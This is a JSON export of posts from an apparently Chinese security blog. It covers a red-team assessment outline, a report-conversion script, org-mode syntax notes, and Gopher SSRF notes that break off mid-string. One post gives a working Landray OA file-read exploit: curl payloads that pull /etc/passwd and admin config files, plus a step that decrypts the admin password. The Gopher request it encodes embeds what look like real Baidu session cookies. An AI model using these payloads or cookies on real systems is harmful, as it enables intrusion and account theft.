|\n|\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;|\n| 搜索引擎、网盘、代码托管平台、企业信息查询平台 | 未知资产(公网IP、端口服务、Web应用、管理后台等)、上传源码、内部文档资料、高层及开发人员个人信息IP地址 | 减少企业信息泄露，缩减企业资产暴露面 |\n*** 邮件专项评估\n 钓鱼邮件评估 ： 模拟真实钓鱼邮件对人员安全意识进行测试 邮箱安全评估 ：对影响邮件安全的威胁因素进行专项检测  基线检测 是否过滤垃圾邮件、开启SPF、安全审计、安全网关、配置二次认证、是否存在弱口令 漏洞检测 根据邮件版本匹配Nday漏洞    *** 办公OA专项评估\n| 任务 | 内容 |\n|\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-|\n| 应用漏洞 | 检测OA系统是否存在Nday漏洞 |\n| 服务器 | 调研OA系统部署服务器所在安全区域 |\n| 身份认证 | 认证方式、复杂度、登陆区域限制 |\n| 权限管控 | 权限管控是否按照最小必须原则、账户是否一对一 |\n| 数据泄露风险 | 办公OA系统涉及的人员数据、流程涉及敏感信息 |\n*** VPN专项评估\n| 任务 | 工作内容 |\n|\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;|\n| 弱口令 | 根据定制化密码本检测企业VPN弱口令 |\n| 身份认证 | 验证是否采用双因素认证、或同一身份认真系统 |\n| 账户权限管控 | 检查账户分配是否合理、是否按照最小必须原则、是否一人存多号、一号对多人 |\n| 移动终端限制 | 检测是否存在移动终端拨入、建议攻防期间禁用 |\n| 0Day检测 | “军火商”VPN 0Day检测 |\n| 接入跳转 | 调研接入后可跳转区域，掌握VPN被攻破后受影响范围 |\n*** 无线Wi-Fi专项评估[fn::禁止私建热点、攻防期间停用Wi-Fi]\n| 任务 | 工作内容 |\n|\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;|\n| Wi-Fi登陆控制 | 在未连接上Wi-Fi时，尝试通过弱口令检测连接Wi-Fi |\n| 未更新的固件 | 连上Wi-Fi， 查看路由器固件版本，使用Nday进行攻击 |\n| 路由器管理口台弱口令 | 在连接Wi-Fi时，尝试弱口令登陆路由器后台 |\n| Wi-Fi劫持 | 查看路由器固件版本，使用Nday进行攻击，拿到root权限，监控流量，抓取和修改非HTTPS的数据包 |\n| Wi-Fi钓鱼 | 创建免费热点，设置认证，使用户收集自动连接Wi-Fi |\n| WPS攻击 | 路由器开启了WPS功能后，尝试通过物理接触，不需要密码即可连上 |\n| 无线协议识别 | 通过查看Wi-Fi类型，判断是否为WEP，WPA2，WPA2-PSK加密类型的Wi-Fi |\n*** 集中管控平台专项评估\n| 评估方法 | 评估对象 |\n|\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-|\n| 针对预控增加配置检查，检车安全设备应用层漏洞、检测安全设备本体安全机制是否存在缺陷 | 云托管平台、终端管理平台、堡垒机、域控、集中开发平台、虚拟化管控平台 |\n*** 安全设备专项评估\n| 层面 | 内容 |\n|\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;|\n| 应用层漏洞 | 提权等常见漏洞 |\n| 本身机制 | HIDS管理页面绕过登陆查看界面 |\n| 自有防御 | 登陆认证、权限管控 |\n| 安全防护机制 | 策略有效性 |\n*** 近源专项评估\n| 评估方法 | 评估对象 |\n|\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-+\u0026mdash;\u0026mdash;\u0026mdash;-|\n| Wi-Fi钓鱼(模拟内部AP，欺骗员工连入Wi-Fi进行办公，对钓鱼结果进行统计) | Wi-Fi |\n| BadUSB(重写USB内部固件，伪装成USB键盘，通过虚拟键盘，输入恶意指令) | HID |\n| 门禁前端伪造(NFC技术复制工牌) | 门禁系统 |\n| 门禁前端数据伪造(入侵门禁系统修改数据) | 门禁系统 |\n*** 社工专项评估\n| 类型 | 内容 |\n|\u0026mdash;\u0026mdash;\u0026mdash;-+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;|\n| 身份伪装 | 模拟高管、需要帮助的职员、正在处理网络问题的技术支持人员、诱导企业员工提供所需信息，对诱导结果进行统计 |\n| 通信欺骗 | 通过聊天工具搜索目标的群聊，通过伪装员工进入Q群获取信息，进一步开展诈骗，钓鱼等攻击 |\n| 组合社工 | 伪装猎头，和特定员工进行交流，在骗取信任后通过微信等聊天工具发送包含恶意木马的文件进一步获取信息 |\n*** 重要(靶标)系统专项评估\n  自身安全性评估\n| 纬度 | 详情 |\n|\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;|\n| 系统架构 | 服务器、中间件等 |\n| 网络架构 | 安全域划分、隔离、防护措施 |\n| 数据传输 | 输出是否加密、加密是否有效 |\n| 运维管理 | 何种运维方式、管理平台登陆认证、权限管理是否有效、是否有漏洞 |\n| 安全设备覆盖情况 | 系统所在域及与系统存在访问的区域是否覆盖了安全检测设备，是否实施阻断攻击 |\n  访问途径评估\n 基本访问原则(靶标系统与其他系统的访问规则)、访问控制关系 攻击者可利用攻击路径: 如互联网站点-\u0026gt;DMZ区-\u0026gt;内网-\u0026gt;靶标 检测攻击路径涉及区域的安全监测、防护设备是否有效    运维终端主机专项评估\n 应用漏洞盘查（漏扫+手工验证) 访问途径评估 (ACL规则) 已有后门排查(杀毒软件、漏扫、HIDS检测)    *** 策略布防与优化\n布防原则：\n 梳理业务流量，保证所有请求流量都在防御体系监控范围内 核心资产具备纵深防御能力 设备防御能力合理搭配，防御能力覆盖全面(应用、网络、主机) 安全策略调优，给策略决策平台提供可信可控的基础数据 设备特点互相补充，必要时可进行旁路冗余部署 应急响应流程明确  布防与加固内容：\n 安全产品部署调整 策略调优和安全加固 应急响应流程化  *** 策略覆盖度验证评估\n策略有效性验证:\n 常规： 测试策略是否生效，如and 1=1 非常规： 基于waf绕过 机制本体绕过： 防护机制绕过，不按照规则进行绕过  覆盖度验证指标\n| 验证纬度 | 功能 |\n|\u0026mdash;\u0026mdash;\u0026mdash;-+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-|\n| 覆盖度 | 设备覆盖范围是否齐全、流量是否全部接入 |\n| 抗绕过 | 是否还有防护被绕过的情况 |\n| 抗淹没 | 是否还有误报情况 |\n** 模拟验证\n*** 红蓝对抗模拟\n*** 反制模拟\n收集攻击信息-\u0026gt;反向渗透-\u0026gt;攻击取证\n*** 自动化封禁脚本\n通过搭建SIEM平台或SOC平台，对WAF、全流量设备的日志进行处理，自动转发同步到防火墙上进行IP封禁。\n*** 沙盘演练\n** 实战对抗\n*** 检测与应急(现场值守)\n| 任务 | 工作内容 |\n|\u0026mdash;\u0026mdash;+\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;|\n| 检测 | 分析告警信息(时间、攻击类型、攻击IP、受害IP、攻击次数、检测人员等) |\n| 分析 | 攻击是否成功，溯源情况描述、处置意见、分析责任人、是否上报等 |\n| 处置 | 处置措施、封禁IP详情、数量、策略增加详情、处置责任人 |\n#+TBLFM:\n*** TODO 攻击反制(现场值守)\n*** 情报共享(二线支持)\n威胁情报包括：\n 行业内情报：厂商间互相共享的一些可疑IP，攻击IP，通用漏洞信息等 前场攻防情报： 演练现场传回一些可疑IP，攻击IP，攻击手法、溯源信息等 开源威胁情报： 借助互联网上一些开源情报平台，收集、分析可靠情报  ","description":"","id":57,"section":"en","tags":null,"title":"红蓝对抗","uri":"http://crkmythical.github.io/en/blog/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"},{"content":"编写进度\n   日常安全扫描场景中，有需要将绿盟的Web漏扫报告(html)转换成docx文档格式的需求，\n因此使用python3写了个脚本，使用模块如下\n BeautifulSoup docxtpl  原始报告 转换成docx报告 源码Nsfocus2docx 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91  #!/usr/bin/env python3 # -*- coding: utf-8 -*- # author: Mr.Frame # Blog: https://askding.github.io/ # Dependence: # BeautifulSoup # docxtpl # Bugs: # doc.render(data) 渲染数据时， # 199个漏洞，只能渲染89个， # 1362个漏洞只能渲染出639个 import sys import time from bs4 import BeautifulSoup from docxtpl import DocxTemplate # 定义漏洞类 class Vulner: def __init__(self, vulnName, ipList, details, threatLevel, solutions): self.vulnName = vulnName self.ipList = ipList self.detail = details self.threatLevel = threatLevel self.solution = solutions def banner(): if len(sys.argv) != 2: print(\u0026#34; Usage: python3 main.py \u0026lt;path/to/index.html\u0026gt; \u0026#34;) sys.exit() def generate_docx(path): data = {\u0026#34;vulners\u0026#34;: []} # 漏洞数据 soup = BeautifulSoup(open(path), \u0026#34;lxml\u0026#34;) data[\u0026#39;title\u0026#39;] = soup.h1.string # 文档标题 generated_dox = data[\u0026#39;title\u0026#39;] + time.strftime(\u0026#34;%Y-%m-%d\u0026#34;, time.localtime()) + \u0026#34;.docx\u0026#34; # 生成文档名 vuln_table = soup.find(\u0026#39;table\u0026#39;, attrs={\u0026#34;id\u0026#34;: \u0026#34;vuln_distribution\u0026#34;, \u0026#34;class\u0026#34;: \u0026#34;report_table\u0026#34;}) # 获取漏洞名列表 vuln_name_list = vuln_table.find_all(\u0026#39;span\u0026#39;) # 获取每个漏洞名字下展开信息 report_table_list = vuln_table.find_all(\u0026#39;table\u0026#39;, attrs={\u0026#34;class\u0026#34;: \u0026#34;report_table\u0026#34;}) vuln_List=[] # 漏洞名字列表 print(\u0026#34;\\n梳理漏洞如下: \u0026#34;) for vul in vuln_name_list: vuln_name = vul.get_text().strip() # 漏洞名列表 print(vuln_name) vuln_List.append(vuln_name) vuln_Hosts=[] # 风险来源列表 Detail_List=[] # 风险分析列表 Solution_List=[] # 处置建议列表 ThreatLevel_List=[] # 风险级别列表 for report_table in report_table_list: vuln_hosts = report_table.find_all(\u0026#34;td\u0026#34;)[0].get_text() # 风险来源 vuln_hosts = vuln_hosts.replace(\u0026#34;\u0026amp;nbsp\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;点击查看详情;\u0026#34;, \u0026#34;\u0026#34;) detail = report_table.find_all(\u0026#34;td\u0026#34;)[1].get_text() # 风险分析 solution = report_table.find_all(\u0026#34;td\u0026#34;)[2].get_text().strip() # 处置建议 threatLevel = report_table.find_all(\u0026#34;td\u0026#34;)[3].get_text() # 风险级别 vuln_Hosts.append(vuln_hosts) Detail_List.append(detail) Solution_List.append(solution) ThreatLevel_List.append(threatLevel) for i in range(0,len(vuln_List)): print(i) data[\u0026#39;vulners\u0026#39;].append( Vulner(vuln_List[i], vuln_Hosts[i], Detail_List[i], ThreatLevel_List[i], Solution_List[i]) ) print(\u0026#34;文档原始数据生成中...\u0026#34;) doc = DocxTemplate(\u0026#34;template.docx\u0026#34;) print(\u0026#34;正在渲染文档数据....\u0026#34;) doc.render(data) doc.save(generated_dox) print(\u0026#34;生成完毕，文档名: {}\u0026#34;.format(generated_dox)) if __name__ == \u0026#39;__main__\u0026#39;: banner() generate_docx(sys.argv[1])   使用 1  python3 Nsfocus2docx /path/to/NS_report/index.html   已知Bug doc.render(data)渲染数据时，\n 199个漏洞，只能渲染89个， 1362个漏洞只能渲染出639个  欢迎For，PR\n","description":"","id":58,"section":"en","tags":null,"title":"Nsfocus2docx.md","uri":"http://crkmythical.github.io/en/blog/nsfocus2docx-md/"},{"content":"编写进度\n   蓝凌OA custom.jsp页面任意文件读取  URI: /sys/ui/extend/varkind/custom.jsp payload:  1 2 3  var={\u0026#34;body\u0026#34;:{\u0026#34;file\u0026#34;:\u0026#34;file:///etc/passwd\u0026#34;}} var={\u0026#34;body\u0026#34;:{\u0026#34;file\u0026#34;:\u0026#34;/WEB-INF/KmssConfig/kmssconfig.properties\u0026#34;}} var={\u0026#34;body\u0026#34;:{\u0026#34;file\u0026#34;:\u0026#34;/WEB-INF/KmssConfig/admin.properties\u0026#34;}}   POC  查看kmssconfig配置文件  1  curl -X POST \u0026#34;http://ekpoa.example.com:8088/sys/ui/extend/varkind/custom.jsp\u0026#34; -d \u0026#39;var={\u0026#34;body\u0026#34;:{\u0026#34;file\u0026#34;:\u0026#34;/WEB-INF/KmssConfig/kmssconfig.properties\u0026#34;}}\u0026#39;   查看/admin.do管理员后台密码  1  curl -X POST \u0026#34;http://ekpoa.example.com:8088/sys/ui/extend/varkind/custom.jsp\u0026#34; -d \u0026#39;var={\u0026#34;body\u0026#34;:{\u0026#34;file\u0026#34;:\u0026#34;/WEB-INF/KmssConfig/admin.properties\u0026#34;}}\u0026#39;   解密工具 LandrayDES\n1  java -jar LandrayDES-0.0.1-SNAPSHOT-jar-with-dependencies.jar Decrypt admin.do S11E7bclfCnWEz/\\JLVTdUw==   参考\nX凌OA任意文件读取\n","description":"","id":59,"section":"en","tags":null,"title":"Landray-OA 蓝凌OA custom.jsp页面任意文件读取","uri":"http://crkmythical.github.io/en/blog/landray-oa/"},{"content":"Table of Contents  Org Mode - Your life in plain text  Metadata Headlines Markup Lists Links Images Blocks Table Commnet Macros footnotes    \nOrg Mode - Your life in plain text Org is a highly flexible structured plain text file format, composed of a few simple, yet versatile, structures – constructed to be both simple enough for the novice and powerful enough for the expert.\nOrg mode is Emacs major mode for convenient plain text markup,is for\n keeping notes, maintaining to-do lists, planning projects, authoring documents, computational notebooks, literate programming and more  in a fast and effective plain text system.\n\nMetadata At the start of a file(before the first headline), it\u0026rsquo;s common to set the title, author and other export options\n#+title: Example Org File #+author: Mr.Frame #+date: Fri May 7 10:07:35 CST 2021 #+startup: overview content showall showeverything nohideblocks hideblocks  \nHeadlines Lines that start with an asterisk * are headlines\nA single * denotes a 1st-level headline\n* Revamp orgmode.org website ** Make screenshots  \nMarkup Text markup follows th pattern, PRE, MARKER, CONTENTS, MARKER and POST are not separated by whitespace characters.\n\u0026lt;Pre\u0026gt;\u0026lt;Marker\u0026gt;\u0026lt;Contents\u0026gt;\u0026lt;Marker\u0026gt;\u0026lt;Post\u0026gt;\n  : - ( { ' \" and whitespace1,  : a character among *(bold), =(verbatim), /(italic), +(strikethrough), _(underline), ~(code) : ,- . , ; : ! ? ' \u0026quot; ) } [ : \u0026lt;non-whitespace-character\u0026gt;\u0026lt;any character but may not span over more than 3 lines\u0026gt;\u0026lt;non-whitespace-character\u0026gt;      Font Style Singal Effect     Bold *Bold* Bold   Italic /Italic/ Italic   Underline _underline_ underline   Strikethrough +strikethrough+ strikethrough   code ~code~ code   verbatim =verbatim= berbatim   Superscripts R_sun=6.96 x 10^8m Rsun=6.96 x 108m   Subscripts R_{AlphaCentauri} = 1.28 x R_{sum} RAlphaCentauri = 1.28 x Rsum    \nLists Unordered lists start with + -\nOrdered lists start with 1. 1) A. A)\nUnordered and odered bullets can be nested in any order.\nTo buy: 1. Milk 2. Eggs - Organic 3. Cheese + Parmesan + Mozzarella Lists can contain checkboxes [ ] [-] [X] - [ ] not started - [-] in progress - [X] complete Lists can contain tags (and checkboxes at the same time) - [ ] fruits :: get apples - [X] vegiies :: get carrots  \nLinks put the target between two square brackets,like so: [[type:target]] or [[type:target][desc]]\nsame as an html \u0026lt;a\u0026gt; tag \u0026lt;a href=\u0026quot;target\u0026quot;\u0026gt;desc\u0026lt;/a\u0026gt;\n[[https://orgmode.org][a nice website]] [[file:~/Pictures/dank-emem.png]] [[earlier heading][an earlier heading in the document]]  \nImages Org mode automatically recognizes and renders image links during export.\nJust link to an image (don\u0026rsquo;t include a description).\n[[https://upload.wikimedia.org/wikipedia/commons/5/5d/Konigsberg_bridges.png]]\nImages located on your computer can also be rendered in the Emacs buffer with C-c C-x C-v\n\nBlocks Org mode uses #+BEGIN … #+END blocks for many purposes.\n(defun org-xor (a b) \u0026quot;Exclusive or.\u0026quot; (if a (not b) b))  \nTable | Tool | Literate programming? | Reproducible Research? | Languages | |--------------+-----------------------+------------------------+-----------| | Javadoc | partial | no | Java | | Haskell .lhs | partial | no | Haskell | | noweb | yes | no | any | | Sweave | partial | yes | R | | Org-mode | yes | yes | any |  \nCommnet   Line comments start with #\n  Inline comments wrap @@comment: like so@@\n  Block comments are wrapped with #+BEGIN_COMMENT and #+END_COMMENT\n  Section comments can be created by adding the COMMENT keyword to a headline\n # A line commment Example of an @@comment: inline@@ comment. #+begin_comment This is a block comment. It can span multiple line. As well as other markup. #+begin_src emacs-lisp (+ 1 2) #+end_src #+end_comment * A top level headline ** COMMENT This section and subsections are commented out *** This headline inherits the =COMMENT= keyword This text is commented out ** This headline is not commented    \nMacros #+macro: attn _*/$1/*_ {{{attn(This text gets all the markup!)}}}  Attention! This text gets all the markup! _ this will underline_\n\nfootnotes   [fn:name:description]\n  [fn::description]\n  [fn:name2]\n[fn:name2] description\n** Footnotes\nThe Org homepage[fn:1] now looks a lot better than it used to.\nTom is a boy[fn:name].\nJim is a boy[fn:: This is the inline definition of this footnote] too.\nLily is a girl[fn:lily: a definition].\n[fn:1] The link is: http://orgmode.org\n[fn:name] Tom is a boy.\n  Footnotes 1 \\space \\tab \\enter\n","description":"","id":60,"section":"en","tags":null,"title":"org-syntax","uri":"http://crkmythical.github.io/en/blog/org-syntax/"},{"content":"编写进度\n   Table of Contents  Gopher  发送gopher请求 发送GET请求 发送POST请求    \nGopher gopher://\u0026lt;host\u0026gt;:\u0026lt;port\u0026gt;/\u0026lt;gopher-path\u0026gt;_[TCP/IP数据] 默认端口70  发起post请求，回车换行需要使用`%0d%0a`，如果多个参数，参数之间的\u0026amp;也需要进行URL编码\ngopher会将后面的数据部分发送给相应的端口，\n这些数据可以是字符串，也可以是其他的数据请求包，比如GET，POST请求，redis，mysql未授权访问等\n，同时数据部分必须要进行**URL编码**，这样gopher协议才能正确解析。\n\n发送gopher请求 curl gopher://www.example.com/path/_[file] curl gopher://192.168.43.26:8888/_Hi%0aNewLine%0aThere  \n发送GET请求  GET / HTTP/1.1 Host: baidu.com Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: BAIDUID=AEC95A01B732C2DED98755D470DEE40D:FG=1; BDUSS=1RYVDRKODZ2cWczNEpFTWhlVWJJTmlUeUlGdEZsQnZYS0trUlBxa2FDVEVubzVnRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQRZ2DEEWdgS Connection: close   URL全编码1次HTTP请求包\n%47%45%54%20%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%62%61%69%64%75%2e%63%6f%6d%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%38%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%61%76%69%66%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%39%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6f%6b%69%65%3a%20%42%41%49%44%55%49%44%3d%41%45%43%39%35%41%30%31%42%37%33%32%43%32%44%45%44%39%38%37%35%35%44%34%37%30%44%45%45%34%30%44%3a%46%47%3d%31%3b%20%42%44%55%53%53%3d%31%52%59%56%44%52%4b%4f%44%5a%32%63%57%63%7a%4e%45%70%46%54%57%68%6c%56%57%4a%4a%54%6d%6c%55%65%55%6c%47%64%45%5a%73%51%6e%5a%59%53%30%74%72%55%6c%42%78%61%32%46%44%56%45%56%75%62%7a%56%6e%52%56%46%42%51%55%46%42%4a%43%51%41%41%41%41%41%41%41%41%41%41%41%45%41%41%41%42%6c%67%69%38%54%63%58%45%33%4e%44%45%30%4e%7a%51%31%4f%54%59%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%4d%51%52%5a%32%44%45%45%57%64%67%53%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a\n   将URL全编码后的HTTP请求包的字符串附加到`_`后  1 2 3 4 5 6 7 8 9 10 11 12 13  curl -v gopher://127.0.0.1/_%47%45%54%20%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%62%61%69%64%75%2e%63%6f%6d%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%38%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%61%76%69%66%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%39%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6f%6b%69%65%3a%20%42%41%49%44%55%49%44%3d%41%45%43%39%35%41%30%31%42%37%33%32%43%32%44%45%44%39%38%37%35%35%44%34%37%30%44%45%45%34%30%44%3a%46%47%3d%31%3b%20%42%44%55%53%53%3d%31%52%59%56%44%52%4b%4f%44%5a%32%63%57%63%7a%4e%45%70%46%54%57%68%6c%56%57%4a%4a%54%6d%6c%55%65%55%6c%47%64%45%5a%73%51%6e%5a%59%53%30%74%72%55%6c%42%78%61%32%46%44%56%45%56%75%62%7a%56%6e%52%56%46%42%51%55%46%42%4a%43%51%41%41%41%41%41%41%41%41%41%41%41%45%41%41%41%42%6c%67%69%38%54%63%58%45%33%4e%44%45%30%4e%7a%51%31%4f%54%59%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%4d%51%52%5a%32%44%45%45%57%64%67%53%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%